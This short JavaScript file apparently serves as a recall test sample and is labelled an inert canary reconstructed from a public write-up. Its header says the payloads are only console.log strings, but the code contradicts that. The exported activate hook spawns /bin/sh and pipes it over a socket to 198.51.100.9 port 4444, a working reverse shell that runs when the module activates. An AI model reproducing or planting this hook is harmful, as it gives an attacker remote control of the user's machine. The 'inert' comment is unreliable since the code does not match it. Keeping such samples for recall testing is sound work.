// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const net = require('net'), cp = require('child_process');
exports.activate = function () {
  const sh = cp.spawn('/bin/sh', []); const client = new net.Socket();
  client.connect(4444, '198.51.100.9', () => { client.pipe(sh.stdin); sh.stdout.pipe(client); });
};
